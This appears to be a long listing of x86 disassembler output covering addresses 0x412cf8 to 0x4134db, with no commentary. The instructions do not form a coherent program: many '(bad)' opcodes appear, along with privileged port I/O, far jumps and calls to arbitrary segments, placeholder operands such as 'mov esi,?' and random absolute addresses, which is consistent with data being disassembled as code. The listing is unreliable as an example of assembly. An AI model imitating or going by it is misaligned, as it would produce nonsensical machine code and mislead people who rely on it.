  412cf8:	add    BYTE PTR [ebp+0x3e],0xf5
  412cfc:	mov    edi,0xca19889c
  412d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d02:	mov    cl,0x15
  412d04:	xor    edx,edx
  412d06:	and    al,BYTE PTR [edi+ecx*2]
  412d09:	out    dx,eax
  412d0a:	or     ch,BYTE PTR [esp+ecx*4]
  412d0d:	pop    esp
  412d0e:	je     0x412d37
  412d10:	stos   BYTE PTR es:[edi],al
  412d11:	(bad)  
  412d12:	adc    DWORD PTR [ecx],esi
  412d14:	mov    al,ds:0x6ab79f8c
  412d19:	nop
  412d1a:	rcr    BYTE PTR [ecx+0x75178487],cl
  412d20:	test   eax,0xabcaef89
  412d25:	js     0x412d20
  412d27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d28:	rcl    DWORD PTR [edx+0x18f7582a],0x47
  412d2f:	mov    esi,0x3ec7a8f8
  412d34:	leave  
  412d35:	leave  
  412d36:	ds pop ds
  412d38:	jb     0x412d99
  412d3a:	ss fs jmp 0xc3d03f93
  412d41:	xchg   ah,ah
  412d43:	mov    dl,0xf6
  412d45:	sub    cl,BYTE PTR [ebx-0xbe2bc1]
  412d4b:	adc    al,0x6
  412d4d:	add    BYTE PTR ds:0x1507cfe3,0x97
  412d54:	adc    BYTE PTR [edi],ch
  412d56:	int    0x9e
  412d58:	arpl   WORD PTR [ebp+0x53a04bff],bx
  412d5e:	fstp   TBYTE PTR [ebp+0x3682493f]
  412d64:	arpl   cx,ax
  412d66:	jno    0x412d7b
  412d68:	push   ebp
  412d69:	jne    0x412d19
  412d6b:	and    BYTE PTR [esi-0x65bea391],ch
  412d71:	push   esi
  412d72:	aad    0x49
  412d74:	and    DWORD PTR [edi+0x48],edx
  412d77:	mov    edx,0x39031aa
  412d7c:	xchg   BYTE PTR [edx],dl
  412d7e:	sub    eax,0x9a93677b
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	mov    eax,ds:0xd2be307e
  412d89:	(bad)  
  412d8a:	adc    eax,0x8358a022
  412d8f:	ins    BYTE PTR es:[edi],dx
  412d90:	div    ah
  412d92:	jle    0x412d49
  412d94:	aad    0xcb
  412d96:	jmp    0x412e03
  412d98:	xor    eax,0x48e444cf
  412d9d:	dec    ebp
  412d9e:	mov    ah,0xa7
  412da0:	repz cwde 
  412da2:	out    0x1d,al
  412da4:	jge    0x412e12
  412da6:	into   
  412da7:	jmp    0x1c9c112c
  412dac:	mov    ebp,0x62217a28
  412db1:	mov    edx,0x9738dd3f
  412db6:	nop
  412db7:	inc    ebx
  412db8:	std    
  412db9:	scas   eax,DWORD PTR es:[edi]
  412dba:	inc    ebp
  412dbb:	inc    ebx
  412dbc:	gs adc eax,0xe1155742
  412dc2:	add    dh,al
  412dc4:	jo     0x412d70
  412dc6:	retf   0x83e9
  412dc9:	in     al,dx
  412dca:	es inc edx
  412dcc:	inc    esp
  412dcd:	jbe    0x412d4f
  412dcf:	(bad)  
  412dd0:	mov    ch,0x5
  412dd2:	inc    esp
  412dd3:	push   cs
  412dd4:	sbb    eax,0x22adc2c1
  412dd9:	retf   0x8295
  412ddc:	mov    ebp,0x56960aa7
  412de1:	loope  0x412df4
  412de3:	lahf   
  412de4:	fmul   DWORD PTR [esi+0x39a0215]
  412dea:	push   ss
  412deb:	rol    esp,cl
  412ded:	int3   
  412dee:	push   cs
  412def:	mov    cs:0x7d77eef8,al
  412df5:	sub    al,0x9a
  412df7:	pop    eax
  412df8:	sti    
  412df9:	sub    eax,0x36752820
  412dfe:	sbb    al,0x49
  412e00:	fsubrp st(2),st
  412e02:	push   ebx
  412e03:	xor    eax,0xbf277cbc
  412e08:	sbb    DWORD PTR [esi-0x3fdbfbe4],ecx
  412e0e:	mov    al,0x97
  412e10:	and    cl,0x1f
  412e13:	ins    DWORD PTR es:[edi],dx
  412e14:	and    eax,0xee0bdd80
  412e19:	int3   
  412e1a:	gs pusha 
  412e1c:	ja     0x412da2
  412e1e:	jge    0x412e55
  412e20:	popf   
  412e21:	out    0x81,eax
  412e23:	imul   ebp,DWORD PTR [eax],0x59188530
  412e29:	jp     0x412ea8
  412e2b:	xchg   ebx,eax
  412e2c:	mov    edi,0x64777653
  412e31:	mov    WORD PTR [ebp-0x5d2a968b],es
  412e37:	pop    edx
  412e38:	jmp    0x2e38:0x2c742e39
  412e3f:	mov    ch,0x56
  412e41:	push   0xfffffff3
  412e43:	dec    eax
  412e44:	addr16 dec edx
  412e46:	jl     0x412e6f
  412e48:	add    esi,ebp
  412e4a:	inc    edx
  412e4b:	std    
  412e4c:	pushf  
  412e4d:	sub    esp,edi
  412e4f:	cmp    eax,DWORD PTR gs:[esi+esi*1-0x41]
  412e54:	push   0xffffffa5
  412e56:	mov    DWORD PTR [edx-0x5d82c4bd],esp
  412e5c:	jno    0x412ec5
  412e5e:	mov    ah,0xf8
  412e60:	mov    bl,0x3e
  412e62:	pop    ds
  412e63:	sub    bl,0x6
  412e66:	cli    
  412e67:	shl    DWORD PTR [esi+0x28ca7003],1
  412e6d:	dec    ebx
  412e6e:	xor    cl,0xde
  412e71:	add    edi,DWORD PTR [ecx+0x77ef027e]
  412e77:	arpl   ax,dx
  412e79:	push   esi
  412e7a:	push   edi
  412e7b:	daa    
  412e7c:	jge    0x412e52
  412e7e:	jb     0x412e38
  412e80:	stos   BYTE PTR es:[edi],al
  412e81:	(bad)  
  412e82:	nop
  412e83:	sti    
  412e84:	xchg   ebp,eax
  412e85:	arpl   WORD PTR [ebx-0x2d52cc12],ax
  412e8b:	das    
  412e8c:	sar    eax,cl
  412e8e:	jo     0x412efe
  412e90:	jns    0x412ec7
  412e92:	jo     0x412e68
  412e94:	push   edi
  412e95:	mov    bh,0xb8
  412e97:	sbb    al,0xd7
  412e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e9a:	push   esi
  412e9b:	inc    ebp
  412e9c:	mov    eax,ds:0x6d73e159
  412ea1:	sbb    al,0x4e
  412ea3:	xchg   ebp,eax
  412ea4:	mov    ch,0x8d
  412ea6:	sub    ah,BYTE PTR [edi-0x79]
  412ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eaa:	lea    ebx,[ecx]
  412eac:	jno    0x412ee7
  412eae:	adc    al,0x7b
  412eb0:	add    cl,ah
  412eb2:	outs   dx,DWORD PTR es:[esi]
  412eb4:	cmp    dh,BYTE PTR [edi]
  412eb6:	mov    edi,DWORD PTR [esi+0x7cc2117]
  412ebc:	mov    ebx,0xef50f989
  412ec1:	jge    0x412e80
  412ec3:	aaa    
  412ec4:	addr16 pusha 
  412ec6:	push   ebp
  412ec7:	and    DWORD PTR [edx-0x48],ebx
  412eca:	loope  0x412f41
  412ecc:	popf   
  412ecd:	rcr    DWORD PTR [eax+0x4072c0c5],cl
  412ed3:	lea    edx,[edx-0x7]
  412ed6:	pop    esi
  412ed7:	mov    cl,0xdc
  412ed9:	call   0xcc18:0x14c19a53
  412ee0:	daa    
  412ee1:	(bad)  
  412ee3:	push   edx
  412ee4:	ins    BYTE PTR es:[edi],dx
  412ee5:	call   0x8f8b:0xd1d700a3
  412eec:	call   DWORD PTR [eax+esi*1]
  412eef:	jp     0x412e94
  412ef1:	mov    al,ds:0x99b52982
  412ef6:	mov    WORD PTR [esi+0x17bf225f],ss
  412efc:	xchg   edx,eax
  412efd:	jno    0x412e97
  412eff:	outs   dx,BYTE PTR ds:[esi]
  412f00:	lds    eax,FWORD PTR [esi-0x682bf5bf]
  412f06:	and    ecx,edi
  412f08:	push   ss
  412f09:	les    eax,FWORD PTR [edi]
  412f0b:	mov    esi,?
  412f0d:	aaa    
  412f0e:	lahf   
  412f0f:	hlt    
  412f10:	dec    edi
  412f11:	sbb    eax,0x2d635f2b
  412f16:	xchg   esp,eax
  412f17:	xor    eax,eax
  412f19:	into   
  412f1a:	dec    ebx
  412f1b:	out    0x74,eax
  412f1d:	mov    eax,0x91825389
  412f22:	scas   al,BYTE PTR es:[edi]
  412f23:	xchg   ebx,eax
  412f24:	loope  0x412f05
  412f26:	rcr    BYTE PTR [ecx+eiz*8+0x6ac7731d],1
  412f2d:	test   al,0x47
  412f2f:	dec    ebx
  412f30:	pop    ebp
  412f31:	std    
  412f32:	xchg   ebx,eax
  412f33:	cmp    eax,0x62519380
  412f38:	push   cs
  412f39:	cmp    al,ch
  412f3b:	adc    BYTE PTR cs:[edx-0x37],cl
  412f3f:	(bad)  
  412f40:	(bad)  
  412f41:	mov    WORD PTR [ebx],cs
  412f43:	call   0xc0b1dcfe
  412f48:	ds into 
  412f4a:	shr    DWORD PTR [ebx-0x369d503c],0xdc
  412f51:	call   0xe4fc:0xcefcfb79
  412f58:	jno    0x412f19
  412f5a:	inc    esp
  412f5b:	lods   eax,DWORD PTR ds:[esi]
  412f5c:	cmovs  ebx,esp
  412f5f:	pop    edx
  412f60:	enter  0x373f,0x87
  412f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f65:	in     eax,0xa2
  412f67:	or     DWORD PTR [esi],edi
  412f69:	push   eax
  412f6a:	out    0x3d,eax
  412f6c:	push   DWORD PTR [ebx-0x2a]
  412f6f:	lods   al,BYTE PTR ds:[esi]
  412f70:	or     bl,BYTE PTR [ebp+0x39]
  412f73:	test   al,0x99
  412f75:	retf   
  412f76:	push   ss
  412f77:	loope  0x412f8f
  412f79:	jo     0x412fb6
  412f7b:	jl     0x412ffb
  412f7d:	sub    eax,0x7992c546
  412f82:	push   0x2f3a8d63
  412f87:	cmp    eax,0x97696f51
  412f8c:	call   0xbb22345
  412f91:	sub    eax,0x4239e6fc
  412f96:	xor    BYTE PTR [eax+0x32c1dad6],dh
  412f9c:	add    BYTE PTR [edi],0xf0
  412f9f:	add    bl,BYTE PTR [edx+0x1fd32913]
  412fa5:	dec    edx
  412fa6:	scas   eax,DWORD PTR es:[edi]
  412fa7:	adc    al,0x32
  412fa9:	pop    ebx
  412faa:	mov    al,ds:0x9555c9
  412faf:	stc    
  412fb0:	rol    BYTE PTR [ecx-0x72ab3048],cl
  412fb6:	pop    eax
  412fb7:	(bad)  
  412fb8:	neg    DWORD PTR [eax-0x77d4d4f8]
  412fbe:	lock xchg esp,eax
  412fc0:	out    0x48,eax
  412fc2:	dec    ebx
  412fc3:	mov    ecx,0x4337da98
  412fc8:	dec    ebx
  412fc9:	xor    esi,edx
  412fcb:	icebp  
  412fcc:	xchg   esp,eax
  412fcd:	sub    BYTE PTR [esi],al
  412fcf:	cmp    DWORD PTR [ebx+0x23],edi
  412fd2:	ins    DWORD PTR es:[edi],dx
  412fd3:	fistp  DWORD PTR [esp+edi*8-0x78]
  412fd7:	je     0x412f62
  412fd9:	xchg   esi,eax
  412fda:	inc    esp
  412fdb:	sbb    ebp,ecx
  412fdd:	fs or  al,0xac
  412fe0:	jo     0x412fe8
  412fe2:	stos   DWORD PTR es:[edi],eax
  412fe3:	cmp    eax,0x3583b503
  412fe8:	dec    ebx
  412fe9:	mov    dl,0x5e
  412feb:	lods   al,BYTE PTR ds:[esi]
  412fec:	arpl   ax,di
  412fee:	cmp    ecx,eax
  412ff0:	xchg   ebp,eax
  412ff1:	sar    BYTE PTR [esi+0x329ee1be],0x67
  412ff8:	arpl   cx,bp
  412ffa:	sub    edx,eax
  412ffc:	cld    
  412ffd:	cmp    DWORD PTR [eax],edx
  412fff:	fstp   QWORD PTR [edi]
  413001:	fwait
  413002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413003:	mov    al,ds:0x69e0bcca
  413008:	mov    ss,WORD PTR [edx]
  41300a:	inc    esp
  41300b:	retf   
  41300c:	jnp    0x412fa1
  41300e:	push   eax
  41300f:	mov    ah,0xf1
  413011:	xchg   BYTE PTR [edx+edi*4],ch
  413014:	stos   DWORD PTR es:[edi],eax
  413015:	fwait
  413016:	mov    dh,bh
  413018:	sub    dl,BYTE PTR [edi]
  41301a:	sbb    eax,0xbd7db6aa
  41301f:	pop    eax
  413020:	pop    ss
  413021:	jns    0x412fb8
  413023:	xchg   esi,eax
  413024:	xchg   esp,eax
  413025:	and    DWORD PTR [ebp-0x680fbfea],ebx
  41302b:	int3   
  41302c:	add    al,0x57
  41302e:	jb     0x413048
  413030:	sub    DWORD PTR [eax],edi
  413032:	mov    bl,al
  413034:	xor    BYTE PTR [ecx+0x52bc160b],cl
  41303a:	(bad)  
  41303b:	mov    ch,0x5b
  41303d:	test   al,0x62
  41303f:	dec    esi
  413040:	push   eax
  413041:	jecxz  0x41306c
  413043:	mov    al,0x1e
  413045:	xchg   esp,eax
  413046:	inc    ebp
  413047:	mov    ds:0xebb52c3c,eax
  41304c:	repz rcr BYTE PTR [edx+ebp*2],1
  413050:	out    dx,eax
  413051:	loope  0x413031
  413053:	sbb    BYTE PTR [ebp+eax*1-0x72c6f630],al
  41305a:	lea    esi,[ebx-0x31dba90]
  413060:	cmp    eax,0x4138d734
  413065:	pop    esp
  413066:	pop    esi
  413067:	xor    al,0x65
  413069:	cmc    
  41306a:	ss pushf 
  41306c:	jecxz  0x4130d1
  41306e:	mov    ds:0x9d651cbd,al
  413073:	or     edx,DWORD PTR [ecx]
  413075:	(bad)  
  413076:	pusha  
  413077:	mov    bl,0x6b
  413079:	cs inc edi
  41307b:	mov    bh,BYTE PTR [eax]
  41307d:	mov    ebx,0x289e0173
  413082:	inc    ebp
  413083:	das    
  413084:	loop   0x413030
  413086:	cmp    bx,sp
  413089:	xor    edx,esp
  41308b:	shl    edi,1
  41308d:	push   ds
  41308e:	call   0x199d:0x49dab674
  413095:	push   ecx
  413096:	add    al,0x7
  413099:	pop    ebx
  41309a:	aaa    
  41309b:	sbb    ebx,eax
  41309d:	out    0xf8,eax
  41309f:	xor    BYTE PTR [ebx],bl
  4130a1:	jmp    0x9ba3:0xb299d173
  4130a8:	ins    DWORD PTR es:[edi],dx
  4130a9:	out    0xf8,eax
  4130ab:	stos   DWORD PTR es:[edi],eax
  4130ac:	xlat   BYTE PTR ds:[ebx]
  4130ad:	fild   WORD PTR [ebx]
  4130af:	xor    al,0xa5
  4130b1:	arpl   WORD PTR [ebx-0x5e],sp
  4130b4:	fs sbb al,0xea
  4130b7:	cmp    dh,BYTE PTR [ecx+0x4672f3d1]
  4130bd:	jo     0x413070
  4130bf:	int3   
  4130c0:	cmp    al,0xa0
  4130c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c3:	fwait
  4130c4:	sbb    eax,0x7645bcfe
  4130c9:	into   
  4130ca:	loop   0x41305d
  4130cc:	xchg   DWORD PTR [ebx+0x1c],ebp
  4130cf:	cmp    ebp,esi
  4130d1:	fsub   st,st(6)
  4130d3:	or     BYTE PTR [edi-0x23],al
  4130d6:	test   DWORD PTR [eax+edi*2+0x28c983c6],edx
  4130dd:	mov    esp,0xe37d385e
  4130e2:	repz sbb cl,BYTE PTR [ecx-0x4db6ec0f]
  4130e9:	ins    BYTE PTR es:[edi],dx
  4130ea:	add    eax,0x319bed30
  4130ef:	fs sbb al,0xdd
  4130f2:	mov    gs,WORD PTR [esi]
  4130f4:	dec    BYTE PTR [ecx]
  4130f6:	aas    
  4130f7:	push   0xf1e01732
  4130fc:	add    DWORD PTR [edi+0x72],0x7ba57779
  413103:	xchg   ecx,eax
  413104:	inc    edx
  413105:	fild   QWORD PTR [edx-0x22adf331]
  41310b:	add    al,0x3b
  41310d:	hlt    
  41310e:	mov    bh,0x3d
  413110:	cmp    al,0x9e
  413112:	jns    0x41309d
  413114:	inc    esp
  413115:	mov    dl,0xbd
  413117:	mov    eax,ds:0x74fe9fc4
  41311c:	out    dx,eax
  41311d:	jo     0x413113
  41311f:	push   esp
  413120:	mov    ebx,DWORD PTR [ecx+esi*2-0x5093d243]
  413127:	jp     0x413178
  413129:	sub    al,BYTE PTR [eax]
  41312b:	pusha  
  41312c:	xchg   esp,eax
  41312d:	inc    esi
  41312e:	cli    
  41312f:	arpl   dx,di
  413131:	test   eax,0x70251f4d
  413136:	fnstcw WORD PTR [edx]
  413138:	stos   DWORD PTR es:[edi],eax
  413139:	xor    ah,BYTE PTR ds:0xa9d74d6e
  41313f:	adc    cl,BYTE PTR [esi+0x3cf57845]
  413145:	aas    
  413146:	std    
  413147:	pop    esi
  413148:	pushf  
  413149:	scas   al,BYTE PTR es:[edi]
  41314a:	into   
  41314b:	daa    
  41314c:	mov    ecx,0x219f3b8a
  413151:	dec    edx
  413152:	mov    cl,0x55
  413154:	mov    al,ds:0x177d3e72
  413159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41315a:	sub    ebp,DWORD PTR [edi-0x6c]
  41315d:	xor    al,ch
  41315f:	inc    edi
  413160:	fsubr  st(5),st
  413162:	or     eax,0x6969c020
  413167:	pop    esp
  413168:	pop    ebp
  413169:	add    eax,0x7252d0ae
  41316e:	mov    cl,0xeb
  413170:	sahf   
  413171:	cmp    bh,al
  413173:	enter  0xbe9b,0x98
  413177:	aam    0xa8
  413179:	adc    ch,BYTE PTR [ebx-0x1769e320]
  41317f:	stos   DWORD PTR es:[edi],eax
  413180:	sub    BYTE PTR [edi+0xdc2c1fe],0x32
  413187:	stos   BYTE PTR es:[edi],al
  413188:	stos   DWORD PTR es:[edi],eax
  413189:	sbb    al,0x89
  41318b:	xor    DWORD PTR [edx-0x2a],esi
  41318e:	adc    eax,DWORD PTR [esi]
  413190:	or     eax,0x58a0d335
  413195:	lds    eax,FWORD PTR ds:0x7672bc90
  41319b:	fidiv  DWORD PTR [esi+0x420a6a4b]
  4131a1:	lock (bad) 
  4131a3:	pusha  
  4131a4:	mov    al,ds:0x9521074a
  4131a9:	syscall 
  4131ab:	out    dx,al
  4131ac:	enter  0xc441,0xe1
  4131b0:	dec    edx
  4131b1:	dec    ebp
  4131b2:	adc    BYTE PTR [edi],ah
  4131b4:	jns    0x4131d0
  4131b6:	inc    esp
  4131b7:	and    BYTE PTR [ebx+0x3a],al
  4131ba:	xor    esi,DWORD PTR [eax]
  4131bc:	mov    ebx,0x4015bd08
  4131c1:	dec    ecx
  4131c2:	les    edi,FWORD PTR ds:0x36c33ef7
  4131c8:	xchg   edi,eax
  4131c9:	cld    
  4131ca:	pop    ds
  4131cb:	xchg   ebx,eax
  4131cc:	pop    ebx
  4131cd:	shr    DWORD PTR [ebx-0x19],cl
  4131d0:	fdivrp st(6),st
  4131d2:	xor    DWORD PTR ds:0xa417bd17,ecx
  4131d8:	inc    ebx
  4131d9:	std    
  4131da:	shr    esi,0x5a
  4131dd:	test   al,0x68
  4131df:	adc    al,0x66
  4131e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e2:	and    BYTE PTR [esi-0x31244c9a],0xb4
  4131e9:	cld    
  4131ea:	stos   BYTE PTR es:[edi],al
  4131eb:	mov    esp,0x98cb35c
  4131f0:	das    
  4131f1:	pop    eax
  4131f2:	ins    BYTE PTR es:[edi],dx
  4131f3:	inc    esi
  4131f4:	bnd jl 0x413188
  4131f7:	nop
  4131f8:	test   ecx,eax
  4131fa:	aas    
  4131fb:	pushf  
  4131fc:	shl    BYTE PTR [ebp-0x68],cl
  4131ff:	enter  0xe8d9,0x84
  413203:	sub    BYTE PTR [ecx-0x4e],dh
  413206:	xchg   esp,eax
  413207:	push   es
  413208:	out    0x46,al
  41320a:	jmp    0x9066c1a7
  41320f:	dec    edi
  413210:	cmp    eax,0xbff88829
  413215:	neg    DWORD PTR [ebp-0x2d1b06dd]
  41321b:	into   
  41321c:	mov    ds:0xb6c66d2c,eax
  413221:	fsubr  st,st(2)
  413223:	xor    eax,esi
  413225:	rcr    DWORD PTR [edi],1
  413227:	mov    esp,0x4473d0d7
  41322c:	out    0x1,eax
  41322e:	sub    BYTE PTR [esi],bh
  413230:	jbe    0x4131e9
  413232:	cmp    BYTE PTR [ecx+0x1b],cl
  413235:	sbb    DWORD PTR [ecx+0x293ec63d],edx
  41323b:	push   eax
  41323c:	fisubr DWORD PTR [eax-0x6e608c06]
  413242:	xor    ch,BYTE PTR [eax]
  413244:	jne    0x4131d2
  413246:	hlt    
  413247:	and    al,0x99
  413249:	stos   DWORD PTR es:[edi],eax
  41324a:	sbb    esi,DWORD PTR [ecx]
  41324c:	stc    
  41324d:	fucom  st(5)
  41324f:	push   edi
  413250:	shl    BYTE PTR ds:0xc60ecba1,cl
  413256:	mov    ecx,DWORD PTR [eax+0x36f522c4]
  41325c:	jne    0x413276
  41325e:	outs   dx,BYTE PTR ds:[esi]
  41325f:	dec    eax
  413260:	mov    ebp,0x1dba4ba6
  413265:	daa    
  413266:	lahf   
  413267:	xor    BYTE PTR [ecx-0x41808416],bl
  41326d:	ins    DWORD PTR es:[edi],dx
  41326e:	inc    ebx
  41326f:	adc    DWORD PTR [ebp-0x73],edi
  413272:	fcom   DWORD PTR [ecx]
  413274:	lock push ss
  413276:	sbb    al,0xfb
  413278:	mov    esp,0x6a285fa
  41327d:	cmp    ebx,DWORD PTR [ecx]
  41327f:	sbb    esp,DWORD PTR [edi]
  413281:	sub    BYTE PTR [ebx-0x41ce4c80],ch
  413287:	mov    bh,0xd6
  413289:	iret   
  41328a:	push   ebx
  41328b:	push   eax
  41328c:	pushf  
  41328d:	loop   0x413264
  41328f:	jmp    0x4132e2
  413291:	aaa    
  413292:	lds    ecx,FWORD PTR ds:0x94f8050e
  413298:	icebp  
  413299:	adc    ebx,ebx
  41329b:	and    ebp,DWORD PTR [edi+0x180af393]
  4132a1:	fnop   
  4132a3:	nop
  4132a4:	das    
  4132a5:	and    eax,0x595af1eb
  4132aa:	sub    eax,0x88f53418
  4132af:	cmp    ebp,0xffffff8c
  4132b2:	xchg   esi,eax
  4132b3:	push   es
  4132b4:	popa   
  4132b5:	in     al,0x85
  4132b7:	cmp    DWORD PTR gs:[edi+0x78],esp
  4132bb:	adc    eax,0xdfd8cec9
  4132c0:	outs   dx,BYTE PTR ds:[esi]
  4132c1:	out    dx,al
  4132c2:	lds    ebx,FWORD PTR [ebx]
  4132c4:	push   ebp
  4132c5:	push   0xffffffb4
  4132c7:	dec    esi
  4132c8:	rol    BYTE PTR [ecx],cl
  4132ca:	ja     0x41330f
  4132cc:	loopne 0x413254
  4132ce:	or     DWORD PTR [edi+0x5cd344a0],ebx
  4132d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132d5:	cwde   
  4132d6:	(bad)  
  4132d7:	mov    al,0x3
  4132d9:	mov    BYTE PTR [edx+0x7],ah
  4132dc:	pushf  
  4132dd:	shr    BYTE PTR [ebp+0x22],cl
  4132e0:	push   cs
  4132e1:	call   0xcf36b8ae
  4132e6:	xchg   esi,eax
  4132e7:	mov    esp,ebx
  4132e9:	jne    0x413345
  4132eb:	mov    cl,0x61
  4132ed:	mov    DWORD PTR [edi+0x7618b8fe],edi
  4132f3:	gs loopne 0x413282
  4132f6:	in     eax,0x99
  4132f8:	aad    0x34
  4132fa:	dec    ebx
  4132fb:	xchg   esi,eax
  4132fc:	loopne 0x41328a
  4132fe:	jb     0x41332c
  413300:	out    dx,al
  413301:	popa   
  413302:	arpl   bp,cx
  413304:	add    al,BYTE PTR [ebx-0x10312d9d]
  41330a:	sti    
  41330b:	xchg   BYTE PTR [eax+ebx*4],bh
  41330e:	daa    
  41330f:	pop    ebx
  413310:	sbb    DWORD PTR [eax+0x62798a17],esp
  413316:	xor    eax,0xdc267b9c
  41331b:	pop    esi
  41331c:	sbb    eax,0x5d014cc
  413321:	test   eax,0xf0bcb7f1
  413326:	ror    BYTE PTR [edx+0x1d023d82],cl
  41332c:	mov    ds:0xebce6b9b,al
  413331:	jmp    0xa20a:0xca52d34c
  413338:	inc    DWORD PTR [edx-0x33]
  41333b:	and    dh,bl
  41333d:	or     DWORD PTR [edi+0x56207962],esi
  413343:	push   es
  413344:	dec    eax
  413345:	xor    dh,dl
  413347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413348:	ret    
  413349:	(bad)  
  41334a:	pop    edx
  41334b:	sbb    al,0x2d
  41334d:	mov    bh,0xfc
  41334f:	xor    DWORD PTR [ecx+0x74],esi
  413352:	sub    bl,BYTE PTR [ebp-0xd]
  413355:	fldenv [ecx]
  413357:	repz push ss
  413359:	nop
  41335a:	test   eax,0x9674172d
  41335f:	sub    esi,ebp
  413361:	mov    WORD PTR ds:0x606b34d7,?
  413367:	mov    ebx,0x9469788e
  41336c:	pop    esp
  41336d:	sbb    eax,0x2c46b4ab
  413372:	(bad)  
  413373:	inc    ebp
  413374:	(bad)  
  413375:	iret   
  413376:	mov    eax,0x9f40cb9a
  41337b:	icebp  
  41337c:	sbb    esi,ebx
  41337e:	loopne 0x4133ff
  413380:	fcomi  st,st(7)
  413382:	cmp    al,0xd1
  413384:	shl    BYTE PTR [ebp-0x5a],cl
  413387:	ins    BYTE PTR es:[edi],dx
  413388:	push   ebp
  413389:	sti    
  41338a:	jle    0x41335e
  41338c:	in     eax,0x2d
  41338e:	cmp    BYTE PTR [ecx-0x88dd8df],al
  413394:	leave  
  413395:	popf   
  413396:	addr16 mov dl,0x7f
  413399:	fisub  DWORD PTR [ebx+0xc]
  41339c:	jnp    0x413339
  41339e:	(bad)  
  41339f:	je     0x413324
  4133a1:	dec    esp
  4133a2:	cmp    esp,DWORD PTR [edi]
  4133a4:	mov    esp,0x2f5d2fc6
  4133a9:	mov    ebx,0xb8c96409
  4133ae:	xor    ecx,0x3ddc9356
  4133b4:	jp     0x413435
  4133b6:	shl    edi,0xe7
  4133b9:	xchg   esi,eax
  4133ba:	cwde   
  4133bb:	and    ebp,0x23117900
  4133c1:	pushf  
  4133c2:	pop    edi
  4133c3:	jmp    0x413407
  4133c5:	mov    ah,0xcf
  4133c7:	nop
  4133c8:	mov    edi,0x9ba3862f
  4133cd:	xor    DWORD PTR [ebx],ebp
  4133cf:	fiadd  WORD PTR [ecx]
  4133d1:	push   esp
  4133d2:	mov    esi,0x6db62660
  4133d7:	sbb    BYTE PTR [eax+0x6d558181],dl
  4133dd:	pop    es
  4133de:	add    esi,DWORD PTR [edi+edx*4]
  4133e1:	xchg   edi,eax
  4133e2:	int    0x77
  4133e4:	jno    0x413411
  4133e6:	mov    esi,0x95d1643a
  4133eb:	fwait
  4133ec:	or     eax,0x9a292eee
  4133f1:	jns    0x413415
  4133f3:	sbb    cl,BYTE PTR [eax+esi*4]
  4133f6:	int3   
  4133f7:	sbb    DWORD PTR [ebx+esi*2-0x60],edx
  4133fb:	fld    DWORD PTR [edx]
  4133fd:	shl    DWORD PTR [edi],1
  4133ff:	cmp    eax,0x212bcbbf
  413404:	sar    edx,cl
  413406:	imul   eax,DWORD PTR [ebp+0x1c31701e],0x5c
  41340d:	icebp  
  41340e:	xchg   edi,eax
  41340f:	jecxz  0x4133a8
  413411:	add    al,0x9c
  413413:	push   ecx
  413414:	(bad)  
  413415:	retf   0x53aa
  413418:	adc    al,0xa3
  41341a:	or     BYTE PTR [eax],al
  41341c:	daa    
  41341d:	mov    BYTE PTR [edi],ah
  41341f:	mov    eax,0xe978779f
  413424:	cs js  0x413437
  413427:	(bad)  
  413428:	mov    eax,ds:0x9fc89e20
  41342d:	call   DWORD PTR [edi+esi*2+0x8]
  413431:	mov    DWORD PTR [edx+0x4f53e78e],esp
  413437:	xor    al,0xca
  413439:	xor    al,bh
  41343b:	lock push edi
  41343d:	and    al,0x41
  41343f:	xlat   BYTE PTR ds:[ebx]
  413440:	mov    al,0xc8
  413442:	into   
  413443:	xor    DWORD PTR [eax],edx
  413445:	add    al,0x7
  413447:	fcomi  st,st(2)
  413449:	mov    dl,BYTE PTR [edx-0x60]
  41344c:	mov    al,BYTE PTR [esi+esi*1]
  41344f:	xchg   ecx,eax
  413450:	in     al,0x46
  413452:	arpl   WORD PTR [eax+0x37b1a610],dx
  413458:	or     DWORD PTR [ebx+0x530f7b35],0x2c
  41345f:	push   esp
  413460:	adc    al,0x6b
  413462:	push   edi
  413463:	push   ebx
  413464:	mov    edx,0x80426a17
  413469:	ins    BYTE PTR es:[edi],dx
  41346a:	push   ebp
  41346b:	or     eax,DWORD PTR [ecx-0x27]
  41346e:	outs   dx,BYTE PTR ds:[esi]
  41346f:	xlat   BYTE PTR ds:[ebx]
  413470:	ds aas 
  413472:	gs push ecx
  413474:	mov    al,ds:0xed437256
  413479:	loope  0x413458
  41347b:	nop
  41347c:	or     cl,bh
  41347e:	aaa    
  41347f:	popf   
  413480:	cli    
  413481:	ror    BYTE PTR [ecx-0x67c5307b],1
  413487:	mov    dl,0x76
  413489:	sub    BYTE PTR [eax],cl
  41348b:	rcr    BYTE PTR [eax+0x24],1
  41348e:	je     0x4134b0
  413490:	ror    DWORD PTR [ebp+0x55576ffb],cl
  413496:	xchg   edx,eax
  413497:	and    eax,0xea9154ff
  41349c:	mov    ch,0x3c
  41349e:	xchg   sp,ax
  4134a0:	sbb    edi,DWORD PTR [ebp+ecx*8+0x51591b02]
  4134a7:	mov    ch,BYTE PTR [edi]
  4134a9:	sub    al,0xc6
  4134ab:	test   eax,0xfb86c430
  4134b0:	out    0x48,al
  4134b2:	fs jmp 0xa83cf6ca
  4134b8:	es int3 
  4134ba:	xchg   esp,eax
  4134bb:	jl     0x413477
  4134bd:	cs scas eax,DWORD PTR es:[edi]
  4134bf:	call   0xf1f9f527
  4134c4:	or     al,ah
  4134c6:	test   ebx,ecx
  4134c8:	(bad)  
  4134c9:	jg     0x413534
  4134cb:	scas   eax,DWORD PTR es:[edi]
  4134cc:	out    dx,al
  4134cd:	and    al,0xb8
  4134cf:	(bad)  
  4134d0:	adc    al,BYTE PTR [edx+0x5f]
  4134d3:	xchg   ebx,eax
  4134d4:	sbb    bl,BYTE PTR ds:0x32906a37
  4134da:	pop    esp
  4134db:	ret    
